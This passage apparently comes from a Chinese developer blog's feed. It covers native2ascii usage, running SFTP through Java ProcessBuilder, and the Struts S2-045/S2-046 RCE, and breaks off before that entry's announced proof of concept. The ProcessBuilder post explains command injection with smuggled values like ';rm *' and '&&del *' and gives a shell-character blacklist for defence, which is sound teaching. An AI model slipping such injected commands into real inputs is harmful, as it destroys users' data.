id="A：将zh-txt转换为Unicode编码，输出文件到u-txt"><a href="#A：将zh-txt转换为Unicode编码，输出文件到u-txt" class="headerlink" title="A：将zh.txt转换为Unicode编码，输出文件到u.txt"></a>A：将zh.txt转换为Unicode编码，输出文件到u.txt</h3><p><code>native2ascii zh.txt u.txt</code><br>打开u.txt，内容为“\u7194\u5ca9”。</p><h3 id="B：将zh-txt转换为Unicode编码，输出到控制台"><a href="#B：将zh-txt转换为Unicode编码，输出到控制台" class="headerlink" title="B：将zh.txt转换为Unicode编码，输出到控制台"></a>B：将zh.txt转换为Unicode编码，输出到控制台</h3><p><code>C:\test&gt;native2ascii zh.txt</code><br>\u7194\u5ca9<br>可以看到，控制台输出了“\u7194\u5ca9”。</p><h3 id="C：将zh-txt转换为ISO8859-1编码，输出文件到i-txt"><a href="#C：将zh-txt转换为ISO8859-1编码，输出文件到i-txt" class="headerlink" title="C：将zh.txt转换为ISO8859-1编码，输出文件到i.txt"></a>C：将zh.txt转换为ISO8859-1编码，输出文件到i.txt</h3><p><code>native2ascii -encoding ISO8859-1 zh.txt i.txt</code><br>打开i.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。</p><h3 id="D：将u-txt转换为本地编码，输出到文件u-nv-txt"><a href="#D：将u-txt转换为本地编码，输出到文件u-nv-txt" class="headerlink" title="D：将u.txt转换为本地编码，输出到文件u_nv.txt"></a>D：将u.txt转换为本地编码，输出到文件u_nv.txt</h3><p><code>native2ascii -reverse u.txt u_nv.txt</code><br>打开u_nv.txt文件，内容为“熔岩”。</p><h3 id="E：将u-txt转换为本地编码，输出到控制台"><a href="#E：将u-txt转换为本地编码，输出到控制台" class="headerlink" title="E：将u.txt转换为本地编码，输出到控制台"></a>E：将u.txt转换为本地编码，输出到控制台</h3><p><code>C:\test&gt;native2ascii -reverse u.txt</code><br>熔岩<br>可以看到，控制台输出了“熔岩”。</p><h3 id="F：将i-txt转换为本地编码，输出到i-nv-txt"><a href="#F：将i-txt转换为本地编码，输出到i-nv-txt" class="headerlink" title="F：将i.txt转换为本地编码，输出到i_nv.txt"></a>F：将i.txt转换为本地编码，输出到i_nv.txt</h3><p><code>native2ascii -reverse i.txt i_nv.txt</code><br>打开i_nv.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。发现转码前后完全一样的。也就是说，等于没有转，或者说思想糊涂，对命名没有理解。。</p><h3 id="G：将i-txt转换为GBK编码，输出到i-gbk-txt"><a href="#G：将i-txt转换为GBK编码，输出到i-gbk-txt" class="headerlink" title="G：将i.txt转换为GBK编码，输出到i_gbk.txt"></a>G：将i.txt转换为GBK编码，输出到i_gbk.txt</h3><p><code>native2ascii -reverse -encoding GBK i.txt i_gbk.txt</code><br>打开i_gbk.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。发现转码前后完全一样的。也就是说，等于没有转，或者说思想糊涂，对命名没有理解。</p><h3 id="H：将u-nv-txt转码到本地编码GBK，输出到控制台"><a href="#H：将u-nv-txt转码到本地编码GBK，输出到控制台" class="headerlink" title="H：将u_nv.txt转码到本地编码GBK，输出到控制台"></a>H：将u_nv.txt转码到本地编码GBK，输出到控制台</h3><p><code>C:\test&gt;native2ascii -reverse -encoding ISO8859-1 i.txt</code><br>熔岩<br>从这个结果看，目标达到到了，编码i.txt为ISO8859-1，转为本地编码后内容为“熔岩”。从这里应该意识到，<red>native2ascii -reverse命令中-encoding指定的编码为源文件的编码格式。而在native2ascii 命令中-encoding指定的编码为（生成的）目标文件的编码格式。这一点非常的重要！切记！！</red><br>继续探索，新建文件12a.txt，内容“12axyz”。看看纯字母数字的编码又如何。</p><h3 id="I：将纯字母数字的文本文件12a-txt转换为Unicode编码"><a href="#I：将纯字母数字的文本文件12a-txt转换为Unicode编码" class="headerlink" title="I：将纯字母数字的文本文件12a.txt转换为Unicode编码"></a>I：将纯字母数字的文本文件12a.txt转换为Unicode编码</h3><p><code>native2ascii 12a.txt 12a_nv.txt</code><br>打开12a_nv.txt文件，内容为“12axyz”。<br>继续测试，转为ISO8859-1编码看看<br><code>C:\test&gt;native2ascii -encoding ISO8859-1 12a.txt</code><br>12axyz<br>结果还是没有转码。<br>从结果可以得出结论：对于纯数字和字母的文本类型件，转码前后的内容是一样的。</p>]]></content>
    
    <summary type="html">
    
      native2ascii.exe 是 Java 的一个文件转码工具，是将特殊各异的内容 转为 用指定的编码标准文体形式统一的表现出来，它通常位于 JDK_home\bin 目录下，安装好 Java SE 后，可在使用 native2ascii 命令进行转码。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="转码" scheme="https://blog.yanzhe.tk/tags/%E8%BD%AC%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>简单使用processbuilder执行shell命令-调用SFTP</title>
    <link href="https://blog.yanzhe.tk/2017/07/18/processbuilder-exec-shell/"/>
    <id>https://blog.yanzhe.tk/2017/07/18/processbuilder-exec-shell/</id>
    <published>2017-07-18T06:07:23.000Z</published>
    <updated>2020-08-23T01:48:10.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ProcessBuilder-start-和-Runtime-exec"><a href="#ProcessBuilder-start-和-Runtime-exec" class="headerlink" title="ProcessBuilder.start()和 Runtime.exec()"></a>ProcessBuilder.start()和 Runtime.exec()</h2><h3 id="相同：都可获取Process实例"><a href="#相同：都可获取Process实例" class="headerlink" title="相同：都可获取Process实例"></a>相同：都可获取Process实例</h3><p>ProcessBuilder.start() 和 Runtime.exec() 方法都被用来<code>创建一个操作系统进程（执行命令行操作），并返回 Process 子类的一个实例</code>，该实例可用来控制进程状态并获得相关信息。</p><p>每个ProcessBuilder实例管理一个进程属性集。ProcessBuilder的start()方法利用这些属性创建一个新的Process实例。start()方法可以从同一实例重复调用，以利用相同或者相关的属性创建新的子进程。</p><h3 id="Process类"><a href="#Process类" class="headerlink" title="Process类"></a>Process类</h3><p>Process 类提供了<code>执行从进程输入、执行输出到进程、等待进程完成、检查进程的退出状态以及销毁（杀掉）进程</code>的方法。创建进程的方法<code>可能无法针对某些本机平台上的特定进程很好地工作</code>，比如，本机窗口进程，守护进程，Microsoft Windows 上的 Win16/DOS 进程，或者 shell 脚本。创建的子进程没有自己的终端或控制台。它的所有标准 io（即 stdin、stdout 和 stderr）操作都将通过三个流 (getOutputStream()、getInputStream() 和 getErrorStream()) <code>重定向到父进程</code>。父进程使用这些流来提供到子进程的输入和获得从子进程的输出。<code>因为有些本机平台仅针对标准输入和输出流提供有限的缓冲区大小，如果读写子 进程的输出流或输入流迅速出现失败，则可能导致子进程阻塞，甚至产生死锁</code>。 当没有 Process 对象的更多引用时，不是删掉子进程，而是继续异步执行子进程。 对于带有 Process 对象的 Java 进程，没有必要异步或并发执行由 Process 对象表示的进程。</p><h3 id="不同点：参数不同，ProcessBuilder更多控制"><a href="#不同点：参数不同，ProcessBuilder更多控制" class="headerlink" title="不同点：参数不同，ProcessBuilder更多控制"></a>不同点：参数不同，ProcessBuilder更多控制</h3><p>ProcessBuilder.start() 和 Runtime.exec()<code>传递的参数有所不同</code>，Runtime.exec()可接受一个单独的字符串，这个字符串是通过空格来分隔可执行命令程序和参数的；也可以接受字符串数组参数。而ProcessBuilder的构造函数是一个字符串列表或者数组。列表中第一个参数是可执行命令程序，其他的是命令行执行是需要的参数。<br>通过查看JDK源码可知，<code>Runtime.exec最终是通过调用ProcessBuilder来真正执行操作的,以ProcessBuilder里用ProcessImpl,start 的一个子进程执行命令,</code>。</p><p>ProcessBuilder为进程提供了更多的控制，例如，可以设置当前工作目录，还可以改变环境参数。而Process的功能相对来说简单的多。<br>ProcessBuilder是一个final类，有两个带参数的构造方法，你可以通过构造方法来直接创建ProcessBuilder的对象。而Process是一个抽象类，一般都通过Runtime.exec()和ProcessBuilder.start()来间接创建其实例。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol><li>修改进程构建器的属性将影响后续由该对象的 start() 方法启动的进程，但从不会影响以前启动的进程或 Java 自身的进程。</li><li>ProcessBuilder类不是同步的。如果多个线程同时访问一个 ProcessBuilder，而其中至少一个线程从结构上修改了其中一个属性，它必须 保持外部同步。</li><li>当没有 Process 对象的更多引用时，不是删掉子进程，而是继续异步执行子进程。 对于带有 Process 对象的 Java 进程，没有必要异步或并发执行由 Process 对象表示的进程。</li></ol><h2 id="使用ProcessBuilder执行shell命令，示例SFTP"><a href="#使用ProcessBuilder执行shell命令，示例SFTP" class="headerlink" title="使用ProcessBuilder执行shell命令，示例SFTP"></a>使用ProcessBuilder执行shell命令，示例SFTP</h2><p>Java示例如下，sftp.properties中四个参数如代码所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 项目名称：</span></span><br><span class="line"><span class="comment"> * Created by YZ on 2017-7-17 16:49.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SFTPProcessUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = LoggerFactory.getLogger(SFTPProcessUtil<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PropertyResourceBundle perperty = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String sftpDir = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">ls</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (perperty == <span class="keyword">null</span>)</span><br><span class="line">            perperty = (PropertyResourceBundle) ResourceBundle.getBundle(<span class="string">"sftp"</span>);</span><br><span class="line">        String curNormalUser = perperty.getString(<span class="string">"sftp.curNormalUser"</span>);</span><br><span class="line">        String sftpUser = perperty.getString(<span class="string">"sftp.user"</span>);</span><br><span class="line">        String sftpHost = perperty.getString(<span class="string">"sftp.host"</span>);</span><br><span class="line">        <span class="keyword">if</span> (sftpDir == <span class="keyword">null</span>)</span><br><span class="line">            sftpDir = perperty.getString(<span class="string">"sftp.dir"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(regexStr(curNormalUser,sftpUser,sftpHost,sftpDir)))&#123;</span><br><span class="line">            logger.error(<span class="string">"SFTPProcessUtil regexStr failed,please check:["</span>+curNormalUser+<span class="string">"],["</span>+sftpUser+<span class="string">"],["</span>+sftpHost+<span class="string">"],["</span>+sftpDir+<span class="string">"]"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curNormalUser = curNormalUser.trim();</span><br><span class="line">        sftpUser = sftpUser.trim();</span><br><span class="line">        sftpHost = sftpHost.trim();</span><br><span class="line">        sftpDir = sftpDir.trim();</span><br><span class="line"></span><br><span class="line">        ProcessBuilder check = <span class="keyword">null</span>;</span><br><span class="line">        InputStream is =<span class="keyword">null</span>;</span><br><span class="line">        Process process = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        OutputStream os = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter bw = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"whoami"</span>);</span><br><span class="line">            process = check.start();</span><br><span class="line">            <span class="keyword">if</span> (process.waitFor() == <span class="number">0</span>)&#123;</span><br><span class="line">                is = process.getInputStream();</span><br><span class="line">                br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">if</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                    <span class="keyword">if</span> (!curNormalUser.equalsIgnoreCase(line.trim()))&#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="string">"root"</span>.equals(line.trim()))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            closeProcess(process,br,bw);</span><br><span class="line">                            check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"su"</span>,curNormalUser);</span><br><span class="line">                            process = check.start();</span><br><span class="line">                            os = process.getOutputStream();</span><br><span class="line">                            bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(os,<span class="string">"UTF-8"</span>));</span><br><span class="line">                            bw.write(<span class="string">"sftp "</span> + sftpUser+<span class="string">"@"</span>+sftpHost+<span class="string">"&lt;&lt;!\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"ls "</span>+ sftpDir + <span class="string">"\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"bye\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"!\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"exit\n"</span>);</span><br><span class="line">                            bw.flush();</span><br><span class="line">                            is = process.getInputStream();</span><br><span class="line">                            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                            line = <span class="keyword">null</span>;</span><br><span class="line">                            list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                                logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                                <span class="keyword">if</span>(!(line.startsWith(<span class="string">"sftp&gt; ls"</span>) || line.startsWith(<span class="string">"sftp&gt; bye"</span>)))&#123;</span><br><span class="line">                                    list.add(line.substring(line.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>,line.length()));</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        closeProcess(process,br,bw);</span><br><span class="line">                        check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"sftp"</span>,sftpUser+<span class="string">"@"</span>+sftpHost,<span class="string">"&lt;&lt;!\n"</span>);</span><br><span class="line">                        process = check.start();</span><br><span class="line">                        os = process.getOutputStream();</span><br><span class="line">                        bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(os,<span class="string">"UTF-8"</span>));</span><br><span class="line">                        bw.write(<span class="string">"ls "</span> + sftpDir + <span class="string">"\n"</span>);</span><br><span class="line">                        bw.write(<span class="string">"bye\n"</span>);</span><br><span class="line">                        bw.write(<span class="string">"!\n"</span>);</span><br><span class="line">                        bw.flush();</span><br><span class="line">                        is = process.getInputStream();</span><br><span class="line">                        br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                        line = <span class="keyword">null</span>;</span><br><span class="line">                        list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                        <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                            logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                            <span class="keyword">if</span>(!(line.startsWith(<span class="string">"sftp&gt; ls"</span>) || line.startsWith(<span class="string">"sftp&gt; bye"</span>)))&#123;</span><br><span class="line">                                list.add(line.substring(line.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>,line.length()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                is = process.getErrorStream();</span><br><span class="line">                br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                String line;</span><br><span class="line">                logger.error(<span class="string">"shell exec error begin"</span>);</span><br><span class="line">                <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    logger.error(line);</span><br><span class="line">                &#125;</span><br><span class="line">                logger.error(<span class="string">"shell exec error end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (list != <span class="keyword">null</span>)&#123;</span><br><span class="line">                Collections.reverse(list);</span><br><span class="line">                <span class="keyword">for</span> (String s:list</span><br><span class="line">                     ) &#123;</span><br><span class="line">                    logger.info(<span class="string">"SFTPProcessUtil.ls() retrun:"</span>+s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder IOException:"</span>,e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder InterruptedException:"</span>,e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder Exception:"</span>,e);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                closeProcess(process,br,bw);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                logger.error(<span class="string">"ProcessBuilder closeProcess:"</span>,e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeProcess</span><span class="params">(Process process, BufferedReader br, BufferedWriter bw)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="keyword">null</span>)</span><br><span class="line">            br.close();</span><br><span class="line">        <span class="keyword">if</span> (bw != <span class="keyword">null</span>)</span><br><span class="line">            bw.close();</span><br><span class="line">        <span class="keyword">if</span> (process != <span class="keyword">null</span>)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证配置文件中的参数是否可用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> strs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">regexStr</span><span class="params">(String... strs)</span></span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> regex = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(String str:strs)&#123;</span><br><span class="line">            <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;regex = <span class="keyword">false</span>; <span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span>(str.matches(<span class="string">"[\t\n\r\f\u0000|;&amp;$&gt;&lt;`\\!~]+"</span>)) &#123;regex = <span class="keyword">false</span>;<span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">            str = str.trim();</span><br><span class="line">            str = str.replaceAll(<span class="string">"[\u4E00-\u9FA5a-zA-Z0-9._-]"</span>,<span class="string">""</span>);</span><br><span class="line">            str = str.replaceAll(<span class="string">"[?/\\x22]"</span>,<span class="string">""</span>);</span><br><span class="line">            regex = regex &amp;&amp; <span class="string">""</span>.equals(str.trim());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：如果是root用户，需要跳转到普通用户。使用su 用户名，跳转时不需要使用输入重定向。但是在操作完后，记得使用exit退出。使用sftp命令时，可以使用<code>&lt;&lt;</code>将输入重定向，并约定结束标记，例如<code>&lt;&lt;!\n</code>，结束时，即需要使用<code>!\n</code>。<br><code>ls dir</code> dir 可输入如<code>/user/????.xml</code></p><p>下面是一个利用修改过的工作目录和环境启动进程的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"myCommand"</span>, <span class="string">"myArg1"</span>, <span class="string">"myArg2"</span>);</span><br><span class="line"><span class="comment">//切换当前 Process p = pb.start();的环境</span></span><br><span class="line">Map&lt;String, String&gt; env = pb.environment();</span><br><span class="line">env.put(<span class="string">"VAR1"</span>, <span class="string">"myValue"</span>);</span><br><span class="line">env.remove(<span class="string">"OTHERVAR"</span>);</span><br><span class="line">env.put(<span class="string">"VAR2"</span>, env.get(<span class="string">"VAR1"</span>) + <span class="string">"suffix"</span>);</span><br><span class="line"><span class="comment">//切换工作目录</span></span><br><span class="line">pb.directory(<span class="string">"myDir"</span>);</span><br><span class="line">Process p = pb.start();</span><br></pre></td></tr></table></figure><p>要利用一组明确的环境变量启动进程，在添加环境变量之前，首先调用 Map.clear()。</p><h2 id="Java中的命令注入"><a href="#Java中的命令注入" class="headerlink" title="Java中的命令注入"></a>Java中的命令注入</h2><p>Java的native调用<br>a. Windows是CreateProcessW 创建子进程执行命令<br>b. Unix中以enecve 来创建子进程执行命令</p><p>Java并没有使用system函数进行创建子进程执行命令，通常我们也知道system的函数非常容易发生注入风险，比如system(“ls “+”test;rm *); 后面部分是用户输入的，用户输入通过注入符号<code>;</code>和后续指令<code>rm *</code>，被系统执行。<br>execve, CreateProcessW 函数通过执行命令和参数分别传递的方式，这种方式杜绝了system的拼接命令的方式，有一定的安全性，但也未必是安全的。</p><p>例如windows下的<code>cmd.exe /K</code>参数可以批量执行命令。如果传入<code>&amp;&amp;del *</code>,最后变成<br><code>cmd.exe /K &quot;del C:\\test1.txt &amp;&amp; del *&amp;&amp;del C:\\test2.txt&quot;</code>.<br>Unix下的<code>/bin/bash –c</code>参数，后续输入参数为执行命令，如果传入<code>;rm *</code>,最后等效于<br><code>/bin/bash –c &quot;sh script.sh; rm *&quot;</code>.</p><p>所以我们应该对参数进行过滤/转码</p><h3 id="常用黑名单"><a href="#常用黑名单" class="headerlink" title="常用黑名单"></a>常用黑名单</h3><p>a. |;&amp;$&gt;&lt;<code>\!可以将这些字符直接作为黑名单过滤 b. \t\n\r\f \u0000 这些字符需要作为黑名单过滤，特别是空字符截断</code>\u0000` (这个在JVM6里是没有保护)</p><p>白名单一般只需允许<code>[a-z][A-Z][0-9] _-</code>等有限的字符.</p><h3 id="常用shell命令的转码"><a href="#常用shell命令的转码" class="headerlink" title="常用shell命令的转码"></a>常用shell命令的转码</h3><p>![常用shell命令的转码](common shell trans.png)<br>参考<a href="http://blog.csdn.net/raintungli/article/details/51917122">博客</a>。</p>]]></content>
    
    <summary type="html">
    
      在jdk 1.5 前使用Runtime.exec()。之后可用ProcessBuilder执行shell命令。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>关于 struts s2-045和s2-046漏洞</title>
    <link href="https://blog.yanzhe.tk/2017/03/31/about-struts-s2-045-and-s2-046/"/>
    <id>https://blog.yanzhe.tk/2017/03/31/about-struts-s2-045-and-s2-046/</id>
    <published>2017-03-31T01:19:28.000Z</published>
    <updated>2020-08-23T01:48:10.239Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。国内外都有大量厂商使用该框架。</p><p>Struts 2中此次存在远程代码执行漏洞(RCE)，主要是处理复杂数据类型时的默认解析，例文件上传，Jakarta Multipart parser，异常处理不当，进入buildErrorMessage触发点，导致OGNL代码执行。<a href="https://cwiki.apache.org/confluence/display/WW/S2-045">s2-045</a>中发现是<code>Content-Type</code>出现异常处理不当。<a href="https://cwiki.apache.org/confluence/display/WW/S2-046">s2-046</a>中发现<code>Content-Disposition</code>的filename存在空字节时，或者是当使用JakartaStreamMultiPartRequest(<code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>)时，<code>Content-Length</code> 的长度值超长。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="漏洞自测触发POC-来源网络"><a href="#漏洞自测触发POC-来源网络" class="headerlink" title="漏洞自测触发POC (来源网络)"></a>漏洞自测触发POC (来源网络)</h2><p>UDPATE: 2018-06-23 change “{ &#35;” to “ '{&#35;' “ for hexo or <code>{&#35;</code></p><p>攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程代码执行。</p><p>查看struts 2.3.15.1版本<br><img data-src="StrutsPrepareAndExecuteFilter_wrapRequest.png" alt="filter中对request进行wrap"><br><img data-src="PrepareOperations_warprequest.png" 